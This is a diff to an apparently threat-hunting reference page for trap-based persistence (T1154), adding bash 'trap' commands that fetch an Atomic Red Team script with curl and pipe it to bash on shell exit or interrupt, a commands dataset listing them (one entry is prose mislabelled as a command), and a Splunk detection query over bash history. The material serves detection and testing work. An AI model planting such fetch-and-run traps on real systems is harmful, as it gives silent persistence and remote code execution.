@@ -33,6 +33,9 @@ Bash
 icbc @ icbc: / $ history
 
 693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
+trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+nohup is used for continuing program/script execution even after exit.
+trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
 ```
 
 ## Commands Dataset
@@ -58,19 +61,36 @@ icbc @ icbc: / $ history
              "693 trap 'nohup curl -sS "
              'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh',
   'name': 'Bash',
-  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': "trap 'nohup curl -sS "
+             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh '
+             "| bash' EXIT",
+  'name': None,
+  'source': 'Kirtar22/Litmus_Test'},
+ {'command': 'nohup is used for continuing program/script execution even after '
+             'exit.',
+  'name': None,
+  'source': 'Kirtar22/Litmus_Test'},
+ {'command': "trap 'nohup curl -sS "
+             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh '
+             "| bash' INT",
+  'name': None,
+  'source': 'Kirtar22/Litmus_Test'}]
 ```
 
 ## Potential Detections
 
 ```json
-
+[{'data_source': 'bash_history logs'}]
 ```
 
 ## Potential Queries
 
 ```json
-
+[{'name': None,
+  'product': 'Splunk',
+  'query': 'index=linux sourcetype=bash_history "trap *" | table '
+           'host,user_name,bash_command'}]
 ```
 
 ## Raw Dataset
